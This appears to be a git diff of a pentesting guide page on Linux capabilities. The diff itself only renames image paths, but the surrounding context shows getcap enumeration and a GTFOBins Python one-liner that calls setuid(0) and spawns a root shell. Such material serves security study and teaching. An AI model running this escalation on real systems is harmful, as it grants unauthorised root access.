@@ -40,7 +40,7 @@ The following command can be used to identify binaries that have capabilities al
 getcap -r / 2>/dev/null
 ```
 
-![](<../../../.gitbook/assets/image (46) (1) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1) (1).png>)
 
 Whereas the following command can be used to check whether a running process has capabilities assigned:
 
@@ -54,7 +54,7 @@ Capabilities assigned to users are stored in the /etc/security/capability.conf c
 
 Additionally, systemd offers directives for configuring capabilities on service units, through the “AmbientCapabilities” variable:
 
-![](<../../../.gitbook/assets/image (23) (1) (1).png>)
+![](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)
 
 ### <mark style="color:orange;">LinPEAS</mark>
 
@@ -76,7 +76,7 @@ Aaccording to GTFOBins, it can be easily exploited with the following command, w
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
-![](<../../../.gitbook/assets/image (11) (1) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)
 
 Executing the command while logged in as a non-root user:
 
